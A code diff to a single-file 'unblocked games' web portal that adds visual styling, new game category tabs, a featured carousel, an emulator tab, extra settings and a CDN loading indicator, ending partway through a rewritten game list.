@@ -166,13 +166,108 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
 @keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:none;}}
 .tab-panel.active{animation:fadeIn 0.2s ease;}
 #user-css{}
+
+#toast-host{position:fixed;left:calc(var(--sidebar-w) + 12px);bottom:118px;z-index:10000;display:flex;flex-direction:column;gap:8px;pointer-events:none;}
+.toast{background:rgba(19,21,37,0.96);border:1px solid var(--border);border-left:3px solid var(--accent);color:var(--text);border-radius:10px;padding:10px 14px;min-width:190px;max-width:360px;font-family:'JetBrains Mono',monospace;font-size:11px;box-shadow:0 8px 26px rgba(0,0,0,0.35);animation:toastIn .18s ease;}
+@keyframes toastIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:none;}}
+#bg-image-layer{position:fixed;inset:0;z-index:0;background-size:cover;background-position:center;opacity:0;pointer-events:none;transition:opacity .25s,filter .25s;}
+#particles-bg{position:fixed;inset:0;z-index:0;pointer-events:none;}
+body.animated-bg{background-size:400% 400% !important;animation:ugsGradient 14s ease infinite;}
+@keyframes ugsGradient{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
+.game-grid.list-view{display:flex;flex-direction:column;align-items:stretch;}
+.game-grid.list-view .gtile{width:100%;max-width:none;text-align:left;}
+ .main{position:relative;z-index:1;}
+.keybind-input{width:54px;text-align:center;text-transform:uppercase;}
+
+
+/* Performance: loading skeletons */
+.ugs-skeleton-wrap{display:flex;flex-wrap:wrap;gap:8px;margin:10px 0;}
+.ugs-skel-tile{width:132px;height:34px;border-radius:8px;background:linear-gradient(90deg,rgba(255,255,255,.05),rgba(255,255,255,.13),rgba(255,255,255,.05));background-size:220% 100%;animation:ugsSkeleton 1.05s infinite;}
+.ugs-skel-line{height:14px;border-radius:10px;background:linear-gradient(90deg,rgba(255,255,255,.05),rgba(255,255,255,.13),rgba(255,255,255,.05));background-size:220% 100%;animation:ugsSkeleton 1.05s infinite;}
+@keyframes ugsSkeleton{0%{background-position:220% 0;}100%{background-position:-220% 0;}}
+#gamejs-loading{max-width:980px;margin:14px auto;background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:16px;display:none;}
+#gamejs-loading.show{display:block;}
+#gamejs-loading .msg{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:12px;}
+
+
+/* ══════════ VISUAL REDESIGN: AURORA + GLASS + NEON ══════════ */
+body{
+  position:relative;
+  background:linear-gradient(120deg,#08111f,#130b2f,#061f24);
+  background-size:300% 300%;
+  animation:auroraCycle 18s ease-in-out infinite;
+}
+body::after{
+  content:'';
+  position:fixed;
+  inset:-20%;
+  z-index:-1;
+  pointer-events:none;
+  background:
+    radial-gradient(circle at 18% 25%, rgba(92,124,250,.35), transparent 32%),
+    radial-gradient(circle at 82% 18%, rgba(34,211,165,.25), transparent 30%),
+    radial-gradient(circle at 50% 90%, rgba(167,139,250,.32), transparent 34%);
+  filter:blur(38px) saturate(1.35);
+  opacity:.9;
+  animation:auroraFloat 16s ease-in-out infinite alternate;
+}
+@keyframes auroraCycle{
+  0%{background-position:0% 50%;}
+  33%{background-position:50% 0%;}
+  66%{background-position:100% 70%;}
+  100%{background-position:0% 50%;}
+}
+@keyframes auroraFloat{
+  0%{transform:translate3d(-2%,0,0) rotate(0deg) scale(1);}
+  50%{transform:translate3d(2%,-2%,0) rotate(8deg) scale(1.04);}
+  100%{transform:translate3d(0,2%,0) rotate(-6deg) scale(1.02);}
+}
+.panel,.s-card{
+  background:rgba(19,21,37,.56) !important;
+  border:1px solid rgba(255,255,255,.14) !important;
+  backdrop-filter:blur(22px) saturate(1.25) !important;
+  -webkit-backdrop-filter:blur(22px) saturate(1.25) !important;
+  box-shadow:0 18px 60px rgba(0,0,0,.24), inset 0 1px 0 rgba(255,255,255,.08);
+}
+.sb-btn.active{
+  box-shadow:0 0 18px rgba(92,124,250,.72), inset 0 0 18px rgba(92,124,250,.14);
+  text-shadow:0 0 12px rgba(92,124,250,.9);
+}
+.gtile:hover{
+  box-shadow:0 0 20px rgba(92,124,250,.8),0 0 44px rgba(167,139,250,.32) !important;
+  text-shadow:0 0 10px rgba(255,255,255,.85);
+}
+.sb-logo{cursor:pointer;user-select:none;border-radius:10px;transition:all .2s ease;}
+.sb-logo:hover{background:rgba(255,255,255,.08);text-shadow:0 0 14px var(--accent);}
+body.sidebar-expanded{--sidebar-w:160px;}
+body.sidebar-expanded .sidebar{width:160px;}
+body.sidebar-expanded .sb-logo{text-align:left;padding-left:12px;font-size:14px;}
+body.sidebar-expanded .sb-btn{flex-direction:row;justify-content:flex-start;gap:10px;min-height:44px;padding:9px 12px;font-size:11px;text-align:left;}
+body.sidebar-expanded .sb-btn .icon{margin-bottom:0;width:26px;text-align:center;}
+body.sidebar-expanded #sb-alpha .sb-btn{font-size:10px;}
+.featured-panel{overflow:hidden;}
+.featured-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:12px;}
+.featured-title{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);}
+.featured-carousel{display:flex;gap:14px;overflow-x:auto;scroll-snap-type:x mandatory;padding:4px 2px 10px;}
+.featured-carousel::-webkit-scrollbar{height:6px;}
+.featured-carousel::-webkit-scrollbar-thumb{background:rgba(255,255,255,.18);border-radius:999px;}
+.featured-card{position:relative;flex:0 0 220px;height:128px;border:1px solid rgba(255,255,255,.14);border-radius:16px;overflow:hidden;cursor:pointer;scroll-snap-align:start;background:rgba(255,255,255,.06);box-shadow:0 12px 36px rgba(0,0,0,.28);transition:transform .18s ease,box-shadow .18s ease,border-color .18s ease;}
+.featured-card:hover{transform:translateY(-3px) scale(1.015);border-color:var(--accent);box-shadow:0 0 24px rgba(92,124,250,.65),0 16px 46px rgba(0,0,0,.36);}
+.featured-card img{width:100%;height:100%;object-fit:cover;display:block;filter:saturate(1.1) contrast(1.05);}
+.featured-card::after{content:'';position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.78),rgba(0,0,0,.06) 62%);}
+.featured-card span{position:absolute;left:12px;right:12px;bottom:10px;z-index:2;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:800;color:white;text-shadow:0 2px 12px rgba(0,0,0,.9);}
+.tab-panel{opacity:0;transform:translateY(8px);transition:opacity .22s ease,transform .22s ease;}
+.tab-panel.active{opacity:1;transform:none;}
+::view-transition-old(root),::view-transition-new(root){animation-duration:.24s;animation-timing-function:ease;}
+@media(max-width:680px){body.sidebar-expanded{--sidebar-w:132px;}body.sidebar-expanded .sidebar{width:132px;}body.sidebar-expanded .sb-btn{font-size:10px;padding:8px 9px}.featured-card{flex-basis:190px;height:110px;}}
+
 </style>
 </head>
 <body>
 
 <!-- SIDEBAR -->
 <div class="sidebar" id="sidebar">
-  <div class="sb-logo">Ultimate</div>
+  <div class="sb-logo" onclick="toggleSidebar()" title="Toggle sidebar">Ultimate</div>
   <div id="sb-clock" style="display:none;text-align:center;font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--muted);padding:0 0 8px;">00:00</div>
   <button class="sb-btn" onclick="ST('games')" id="t-games"><span class="icon">🎮</span>Games</button>
   <button class="sb-btn" onclick="ST('pizza')" id="t-pizza"><span class="icon">🍕</span>Pizza</button>
@@ -180,9 +275,13 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
   <button class="sb-btn" onclick="ST('cool')" id="t-cool"><span class="icon">🧮</span>Cool</button>
   <button class="sb-btn" onclick="ST('poki')" id="t-poki"><span class="icon">🎯</span>Poki</button>
   <button class="sb-btn" onclick="ST('extra')" id="t-extra"><span class="icon">🕹</span>More</button>
+  <button class="sb-btn" onclick="ST('fighting')" id="t-fighting"><span class="icon">🥊</span>Fighting</button>
+  <button class="sb-btn" onclick="ST('racing')" id="t-racing"><span class="icon">🏎️</span>Racing</button>
+  <button class="sb-btn" onclick="ST('puzzle')" id="t-puzzle"><span class="icon">🧩</span>Puzzle</button>
   <div class="sb-divider"></div>
   <button class="sb-btn" onclick="ST('browser')" id="t-browser"><span class="icon">🌐</span>Web</button>
   <button class="sb-btn" onclick="ST('dos')" id="t-dos"><span class="icon">💾</span>DOS</button>
+  <button class="sb-btn" onclick="ST('windos')" id="t-windos"><span class="icon">🖥️</span>WinDOS</button>
   <button class="sb-btn" onclick="ST('gnmath')" id="t-gnmath"><span class="icon">📐</span>GN Math</button>
   <button class="sb-btn" onclick="ST('tools')" id="t-tools"><span class="icon">⚙</span>Tools</button>
   <button class="sb-btn" onclick="ST('b64')" id="t-b64"><span class="icon">📦</span>B64</button>
@@ -237,6 +336,20 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
 <div class="tab-panel" id="tab-pizza">
   <div class="page-title">🍕 Pizza Edition</div>
   <div class="page-sub">Classic unblocked games collection</div>
+  <div class="panel featured-panel">
+    <div class="featured-head">
+      <div class="featured-title">⭐ Featured Games</div>
+      <div style="font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace;">Swipe / scroll →</div>
+    </div>
+    <div class="featured-carousel" id="pizza-featured-carousel">
+      <div class="featured-card" onclick="launchGame('Slice Master','https://www.crazygames.com/game/slice-master')"><img src="https://images.crazygames.com/games/slice-master/cover_16x9-1709110553694.png" onerror="this.style.display='none'" alt="Slice Master"><span>Slice Master</span></div>
+      <div class="featured-card" onclick="launchGame('1v1.LOL','https://www.crazygames.com/game/1v1-lol')"><img src="https://images.crazygames.com/games/1v1-lol/cover_16x9-1707829636204.png" onerror="this.style.display='none'" alt="1v1.LOL"><span>1v1.LOL</span></div>
+      <div class="featured-card" onclick="launchGame('Run 3','https://www.crazygames.com/game/run-3')"><img src="https://images.crazygames.com/games/run-3/cover_16x9-1709113555712.png" onerror="this.style.display='none'" alt="Run 3"><span>Run 3</span></div>
+      <div class="featured-card" onclick="launchGame('Moto X3M','https://www.coolmathgames.com/0-moto-x3m')"><img src="https://img.gamedistribution.com/61738c85cf2241da8558d94f904881ac-512x384.jpeg" onerror="this.style.display='none'" alt="Moto X3M"><span>Moto X3M</span></div>
+      <div class="featured-card" onclick="launchGame('Drift Hunters','https://www.crazygames.com/game/drift-hunters')"><img src="https://images.crazygames.com/games/drift-hunters/cover_16x9-1709112454734.png" onerror="this.style.display='none'" alt="Drift Hunters"><span>Drift Hunters</span></div>
+      <div class="featured-card" onclick="launchGame('Fireboy and Watergirl','https://www.crazygames.com/game/fireboy-and-watergirl')"><img src="https://images.crazygames.com/games/fireboy-and-watergirl/cover_16x9-1709112605014.png" onerror="this.style.display='none'" alt="Fireboy and Watergirl"><span>Fireboy & Watergirl</span></div>
+    </div>
+  </div>
   <div class="panel">
     <input class="finput" type="text" id="pizza-search" placeholder="Search pizza games..." style="width:100%;max-width:320px;margin-bottom:12px;" oninput="filterG(PIZZA,'pizza-list',this.value)">
     <div class="game-grid" id="pizza-list"></div>
@@ -293,6 +406,36 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
   <div class="panel">
     <input class="finput" type="text" id="extra-search" placeholder="Search..." style="width:100%;max-width:320px;margin-bottom:12px;" oninput="filterG(EXTRA,'extra-list',this.value)">
     <div class="game-grid" id="extra-list"></div>
+  </div>
+</div>
+
+<!-- FIGHTING TAB -->
+<div class="tab-panel" id="tab-fighting">
+  <div class="page-title">🥊 Fighting</div>
+  <div class="page-sub">Street Fighter, Mortal Kombat flash games, SSF2, stick fighters, anime fighters</div>
+  <div class="panel">
+    <input class="finput" type="text" id="fighting-search" placeholder="Search fighting games..." style="width:100%;max-width:320px;margin-bottom:12px;" oninput="filterG(FIGHTING,'fighting-list',this.value)">
+    <div class="game-grid" id="fighting-list"></div>
+  </div>
+</div>
+
+<!-- RACING TAB -->
+<div class="tab-panel" id="tab-racing">
+  <div class="page-title">🏎️ Racing</div>
+  <div class="page-sub">Moto X3M full series, Drift Hunters, Road of Fury, driving, stunts, bikes</div>
+  <div class="panel">
+    <input class="finput" type="text" id="racing-search" placeholder="Search racing games..." style="width:100%;max-width:320px;margin-bottom:12px;" oninput="filterG(RACING,'racing-list',this.value)">
+    <div class="game-grid" id="racing-list"></div>
+  </div>
+</div>
+
+<!-- PUZZLE TAB -->
+<div class="tab-panel" id="tab-puzzle">
+  <div class="page-title">🧩 Puzzle</div>
+  <div class="page-sub">Portal Flash, Bloxorz, Cut the Rope, Wheely, IQ Ball, logic classics</div>
+  <div class="panel">
+    <input class="finput" type="text" id="puzzle-search" placeholder="Search puzzle games..." style="width:100%;max-width:320px;margin-bottom:12px;" oninput="filterG(PUZZLE,'puzzle-list',this.value)">
+    <div class="game-grid" id="puzzle-list"></div>
   </div>
 </div>
 
@@ -435,13 +578,35 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
   <div class="page-sub">Powered by WebSocket AI — no key needed ✓</div>
   <div id="ai-chat-wrap">
     <div id="ai-notice">
-      Don't abuse AI please. Issues? Join <a href="https://discord.gg/gn-math" target="_blank">our discord</a>.
+      Free AI powered by the GN Math server. Don't abuse it — it's shared by everyone. Issues? Join <a href="https://discord.gg/gn-math" target="_blank">discord</a>.
     </div>
     <div id="ai-status">Connecting...</div>
     <div id="ai-messages"></div>
     <div id="ai-input-row">
       <input type="text" id="ai-text-input" placeholder="Ask something..." autocomplete="off" disabled />
       <button id="ai-send-btn" disabled>Send</button>
+    </div>
+  </div>
+</div>
+
+
+<!-- WINDOS TAB -->
+<div class="tab-panel" id="tab-windos">
+  <div class="page-title">🖥️ WinDOS</div>
+  <div class="page-sub">v86 emulator presets — FreeDOS · Windows 95 · KolibriOS</div>
+  <div class="panel">
+    <div class="panel-title">🖥️ v86 Emulator</div>
+    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:12px;">
+      <button class="fbtn green" onclick="launchWinDOS('freedos')">▶ FreeDOS</button>
+      <button class="fbtn green" onclick="launchWinDOS('win95')">▶ Windows 95</button>
+      <button class="fbtn green" onclick="launchWinDOS('kolibri')">▶ Linux (Kolibri)</button>
+      <button class="fbtn" onclick="windosFullscreen()">⛶ Fullscreen</button>
+      <button class="fbtn" onclick="windosReset()">↺ Reset</button>
+      <span id="windos-status" style="font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--muted);">Idle</span>
+    </div>
+    <div id="windos-error" style="display:none;margin-bottom:10px;padding:10px 12px;border-radius:8px;background:rgba(244,63,94,0.12);border:1px solid rgba(244,63,94,0.3);color:var(--red);font-family:'JetBrains Mono',monospace;font-size:11px;"></div>
+    <div id="v86-holder" style="width:800px;height:600px;max-width:100%;margin:0 auto;background:#000;border:1px solid var(--border);border-radius:12px;overflow:hidden;display:flex;align-items:stretch;justify-content:stretch;">
+      <canvas id="v86-screen" style="width:100%;height:100%;display:block;background:#000;"></canvas>
     </div>
   </div>
 </div>
@@ -499,7 +664,7 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
     </div>
     <div class="s-card">
       <div class="s-card-title">🧩 Interface</div>
-      <div class="s-row"><div><div class="s-label">Default Tab on Load</div></div><div class="s-ctl"><select class="fselect" id="s-default-tab" onchange="SA()"><option value="games">Ultimate Games</option><option value="pizza">Pizza Edition</option><option value="pzrd">Pizzardition</option><option value="cool">Coolmath</option><option value="poki">Poki/Crazy</option><option value="extra">More Games</option><option value="browser">Web Browser</option><option value="dos">DOS Games</option><option value="gnmath">GN Math</option><option value="tools">Tools</option><option value="b64">B64 Viewer</option><option value="ai">AI Chat</option><option value="sites">Sites</option><option value="settings">Settings</option></select></div></div>
+      <div class="s-row"><div><div class="s-label">Default Tab on Load</div></div><div class="s-ctl"><select class="fselect" id="s-default-tab" onchange="SA()"><option value="games">Ultimate Games</option><option value="pizza">Pizza Edition</option><option value="pzrd">Pizzardition</option><option value="cool">Coolmath</option><option value="poki">Poki/Crazy</option><option value="extra">More Games</option><option value="fighting">Fighting</option><option value="racing">Racing</option><option value="puzzle">Puzzle</option><option value="browser">Web Browser</option><option value="dos">DOS Games</option><option value="windos">WinDOS</option><option value="gnmath">GN Math</option><option value="tools">Tools</option><option value="b64">B64 Viewer</option><option value="ai">AI Chat</option><option value="sites">Sites</option><option value="settings">Settings</option></select></div></div>
       <div class="s-row"><div><div class="s-label">Remember Last Tab</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-remember-tab" onchange="SA()"><span class="toggle-sl"></span></label></div></div>
       <div class="s-row"><div><div class="s-label">Open Games in New Tab</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-newtab" onchange="SA()"><span class="toggle-sl"></span></label></div></div>
       <div class="s-row"><div><div class="s-label">Show Bottom Search Bar</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-show-searchbar" onchange="SA()" checked><span class="toggle-sl"></span></label></div></div>
@@ -508,6 +673,45 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
       <div class="s-row"><div><div class="s-label">Center Content Width</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-center-panels" onchange="SA()" checked><span class="toggle-sl"></span></label></div></div>
       <div class="s-row"><div><div class="s-label">Bigger Buttons</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-big-buttons" onchange="SA()"><span class="toggle-sl"></span></label></div></div>
       <div class="s-row"><div><div class="s-label">Monospace UI Mode</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-mono-ui" onchange="SA()"><span class="toggle-sl"></span></label></div></div>
+    </div>
+
+    <div class="s-card">
+      <div class="s-card-title">⚡ Performance</div>
+      <div class="s-row"><div><div class="s-label">Lazy-load Game iFrames</div><div class="s-desc">Keeps heavy embeds blank until their tab or game is opened.</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-lazy-iframes" onchange="SA()" checked><span class="toggle-sl"></span></label></div></div>
+      <div class="s-row"><div><div class="s-label">Image Preloading</div><div class="s-desc">Preloads icons/background image when possible.</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-preload-images" onchange="SA()"><span class="toggle-sl"></span></label></div></div>
+      <div class="s-row"><div><div class="s-label">Cache Game List</div><div class="s-desc">Stores game arrays in localStorage for 24 hours.</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-cache-games" onchange="SA()" checked><span class="toggle-sl"></span></label></div></div>
+    </div>
+    <div class="s-card">
+      <div class="s-card-title">⌨️ Keybinds</div>
+      <div class="s-row"><div><div class="s-label">Games Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-games" maxlength="1" oninput="SA()" placeholder="G"></div></div>
+      <div class="s-row"><div><div class="s-label">Pizza Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-pizza" maxlength="1" oninput="SA()" placeholder="P"></div></div>
+      <div class="s-row"><div><div class="s-label">Pzrd Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-pzrd" maxlength="1" oninput="SA()" placeholder="Z"></div></div>
+      <div class="s-row"><div><div class="s-label">Cool Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-cool" maxlength="1" oninput="SA()" placeholder="C"></div></div>
+      <div class="s-row"><div><div class="s-label">Poki Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-poki" maxlength="1" oninput="SA()" placeholder="O"></div></div>
+      <div class="s-row"><div><div class="s-label">More Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-extra" maxlength="1" oninput="SA()" placeholder="M"></div></div>
+      <div class="s-row"><div><div class="s-label">Fighting Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-fighting" maxlength="1" oninput="SA()" placeholder="F"></div></div>
+      <div class="s-row"><div><div class="s-label">Racing Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-racing" maxlength="1" oninput="SA()" placeholder="R"></div></div>
+      <div class="s-row"><div><div class="s-label">Puzzle Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-puzzle" maxlength="1" oninput="SA()" placeholder="Q"></div></div>
+      <div class="s-row"><div><div class="s-label">Browser Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-browser" maxlength="1" oninput="SA()" placeholder="B"></div></div>
+      <div class="s-row"><div><div class="s-label">DOS Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-dos" maxlength="1" oninput="SA()" placeholder="D"></div></div>
+      <div class="s-row"><div><div class="s-label">WinDOS Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-windos" maxlength="1" oninput="SA()" placeholder="W"></div></div>
+      <div class="s-row"><div><div class="s-label">GN Math Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-gnmath" maxlength="1" oninput="SA()" placeholder="N"></div></div>
+      <div class="s-row"><div><div class="s-label">Tools Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-tools" maxlength="1" oninput="SA()" placeholder="T"></div></div>
+      <div class="s-row"><div><div class="s-label">Settings Tab</div></div><div class="s-ctl"><input class="finput keybind-input" id="s-key-settings" maxlength="1" oninput="SA()" placeholder="S"></div></div>
+    </div>
+    <div class="s-card">
+      <div class="s-card-title">📐 Layout</div>
+      <div class="s-row"><div><div class="s-label">Sidebar Icon Size</div></div><div class="s-ctl"><select class="fselect" id="s-sidebar-icon-size" onchange="SA()"><option value="small">Small</option><option value="medium">Medium</option><option value="large">Large</option></select></div></div>
+      <div class="s-row"><div><div class="s-label">Game Tile Size</div></div><div class="s-ctl"><select class="fselect" id="s-game-tile-size" onchange="SA()"><option value="compact">Compact</option><option value="normal">Normal</option><option value="large">Large</option></select></div></div>
+      <div class="s-row"><div><div class="s-label">Game Tile View</div></div><div class="s-ctl"><select class="fselect" id="s-game-view" onchange="SA()"><option value="grid">Grid</option><option value="list">List</option></select></div></div>
+    </div>
+    <div class="s-card">
+      <div class="s-card-title">🌌 Background</div>
+      <div class="s-row"><div><div class="s-label">Animated Gradient Background</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-animated-bg" onchange="SA()"><span class="toggle-sl"></span></label></div></div>
+      <div class="s-row"><div><div class="s-label">Background Image URL</div></div><div class="s-ctl"><input class="finput" type="text" id="s-bg-image" placeholder="https://..." oninput="SA()" style="width:260px;"></div></div>
+      <div class="s-row"><div><div class="s-label">Background Blur</div></div><div class="s-ctl"><input type="range" id="s-bg-blur" min="0" max="24" step="1" oninput="SA()"></div></div>
+      <div class="s-row"><div><div class="s-label">Background Dim</div></div><div class="s-ctl"><input type="range" id="s-bg-dim" min="0" max="90" step="5" oninput="SA()"></div></div>
+      <div class="s-row"><div><div class="s-label">Particle Effect</div><div class="s-desc">Lazy-loads tsParticles CDN when enabled.</div></div><div class="s-ctl"><label class="toggle"><input type="checkbox" id="s-particles" onchange="SA()"><span class="toggle-sl"></span></label></div></div>
     </div>
     <div class="s-card">
       <div class="s-card-title">💾 Data</div>
@@ -522,6 +726,9 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
 
 <a class="corner-link" href="https://docs.google.com/document/d/1_FmH3BlSBQI7FGgAQL59-ZPe8eCxs35wel6JUyVaG8Q/" target="_blank">📄 UGS Doc</a>
 <button id="panic-btn" onclick="doPanic()">🚨 PANIC</button>
+<div id="toast-host"></div>
+<div id="bg-image-layer"></div>
+<div id="particles-bg"></div>
 
 <div id="global-search-bar">
   <span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);white-space:nowrap;">🔍 SEARCH</span>
@@ -533,6 +740,9 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
     <option value="cool">Coolmath</option>
     <option value="poki">Poki/Crazy</option>
     <option value="extra">More</option>
+    <option value="fighting">Fighting</option>
+    <option value="racing">Racing</option>
+    <option value="puzzle">Puzzle</option>
     <option value="dos">DOS</option>
     <option value="sites">Sites</option>
   </select>
@@ -548,7 +758,21 @@ input[type="button"]:hover{background:var(--accent);border-color:var(--accent);t
 <style id="user-css"></style>
 
 <script src="https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@main/searchbut.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@main/game.js"></script>
+<script>
+(function(){
+  const box=document.createElement('div');
+  box.id='gamejs-loading';
+  box.className='show';
+  box.innerHTML='<div class="msg">Loading Ultimate Games CDN list…</div><div class="ugs-skeleton-wrap">'+Array.from({length:18},()=>'<div class="ugs-skel-tile"></div>').join('')+'</div>';
+  const main=document.getElementById('tab-games');
+  if(main) main.appendChild(box);
+  const s=document.createElement('script');
+  s.src='https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@main/game.js';
+  s.onload=()=>{box.classList.remove('show');box.remove();};
+  s.onerror=()=>{box.querySelector('.msg').textContent='Game list CDN failed to load. Built-in tabs still work.';};
+  document.head.appendChild(s);
+})();
+</script>
 
 <!-- ══════════ AI WEBSOCKET CHAT ══════════ -->
 <script>
@@ -688,6 +912,7 @@ async function loadInOverlay(url){
   else{frame.src=url;document.getElementById('ov-status').style.display='none';}
 }
 function launchGame(name,url){
+  showToast('Launching '+name);
   currentGameUrl=url;if(S.newTab){window.open(url,'_blank');return;}
   ovProxyOn=S.autoProxy!==false;updateOvProxyBtn();
   document.getElementById('ov-title').textContent='▶ '+name;
@@ -801,145 +1026,1223 @@ function b64ToHtml(){const ed=document.getElementById('main-editor');try{ed.valu
 function viewInBlank(){let c=document.getElementById('main-editor').value.trim();if(!c)return;if(!c.includes('<')&&!c.includes(' ')){try{c=decodeURIComponent(escape(atob(c)));}catch(e){}}const w=window.open('about:blank','_blank');w.document.open();w.document.write(c);w.document.close();}
 
 // ══ GAME DATA ══
-const PIZZA=[
-  {n:'Slice Master',u:'https://www.coolmathgames.com/0-slice-master'},{n:'Among Us',u:'https://now.gg/play/innersloth-llc/6289/among-us'},
-  {n:'1v1.LOL',u:'https://1v1.lol'},{n:'Subway Surfers',u:'https://poki.com/en/g/subway-surfers'},
-  {n:'Slope',u:'https://slope-game.github.io/'},{n:'Run 3',u:'https://www.coolmathgames.com/0-run-3'},
-  {n:'Snake',u:'https://playsnake.org/'},{n:'Basketball Stars',u:'https://poki.com/en/g/basketball-stars'},
-  {n:'Moto X3M',u:'https://poki.com/en/g/moto-x3m'},{n:'Retro Bowl',u:'https://www.retrobowl.co.uk/'},
-  {n:'Drift Hunters',u:'https://drift-hunters.io/'},{n:'Drift Boss',u:'https://driftboss.io/'},
-  {n:'Friday Night Funkin',u:'https://fridaynightfunkin.net/friday-night-funkin-online/'},
-  {n:'Minecraft Classic',u:'https://classic.minecraft.net/'},{n:'Krunker.io',u:'https://krunker.io'},
-  {n:'Shell Shockers',u:'https://shellshock.io'},{n:'Agar.io',u:'https://agar.io'},
-  {n:'Diep.io',u:'https://diep.io'},{n:'Paper.io 2',u:'https://paper-io.com'},
-  {n:'Slither.io',u:'https://slither.io'},{n:'Moomoo.io',u:'https://moomoo.io'},
-  {n:'Hole.io',u:'https://hole-io.com/'},{n:'Dino Game',u:'https://chromedino.com/'},
-  {n:'Flappy Bird',u:'https://flappybird.io/'},{n:'Geometry Dash',u:'https://geometrydashgame.org/'},
-  {n:"Papa's Pizzeria",u:'https://www.coolmathgames.com/0-papas-pizzeria'},{n:"Papa's Freezeria",u:'https://www.coolmathgames.com/0-papas-freezeria'},
-  {n:"Papa's Burgeria",u:'https://www.coolmathgames.com/0-papas-burgeria'},{n:"Papa's Cupcakeria",u:'https://www.coolmathgames.com/0-papas-cupcakeria'},
-  {n:"Papa's Wingeria",u:'https://www.coolmathgames.com/0-papas-wingeria'},{n:"Papa's Pancakeria",u:'https://www.coolmathgames.com/0-papas-pancakeria'},
-  {n:"Papa's Taco Mia",u:'https://www.coolmathgames.com/0-papas-taco-mia'},{n:"Papa's Scooperia",u:'https://www.coolmathgames.com/0-papas-scooperia'},
-  {n:"Papa's Cheeseria",u:'https://www.coolmathgames.com/0-papas-cheeseria'},
-  {n:'Smash Karts',u:'https://smashkarts.io/'},{n:'Voxiom.io',u:'https://voxiom.io/'},
-  {n:'Ev.io',u:'https://ev.io/'},{n:'Zombs Royale',u:'https://zombsroyale.io'},
-  {n:'Bonk.io',u:'https://bonk.io/'},{n:'Skribbl.io',u:'https://skribbl.io'},
-  {n:'GarticPhone',u:'https://garticphone.com'},{n:'2048',u:'https://play2048.co/'},
-  {n:'Tetris',u:'https://tetris.com/play-tetris'},{n:'Bad Ice-Cream',u:'https://www.coolmathgames.com/0-bad-ice-cream'},
-  {n:'Bad Ice-Cream 2',u:'https://www.coolmathgames.com/0-bad-ice-cream-2'},{n:'Bad Ice-Cream 3',u:'https://www.coolmathgames.com/0-bad-ice-cream-3'},
-  {n:'Fireboy & Watergirl',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-in-the-forest-temple'},
-  {n:'Fireboy & Watergirl 2',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-2'},
-  {n:'Fireboy & Watergirl 3',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-3'},
-  {n:'Fireboy & Watergirl 4',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-4'},
-  {n:'Fireboy & Watergirl 5',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-5'},
-  {n:'Tank Trouble',u:'https://tanktrouble.com/'},{n:'Super Smash Flash 2',u:'https://www.mcleodgaming.com/games/super-smash-flash-2'},
-  {n:'Strike Force Heroes',u:'https://strikeforceheroes.io/'},{n:'Learn to Fly',u:'https://www.coolmathgames.com/0-learn-to-fly'},
-  {n:'Fancy Pants',u:'https://www.coolmathgames.com/0-fancy-pants-adventures'},{n:'Red Ball 4',u:'https://www.coolmathgames.com/0-red-ball-4'},
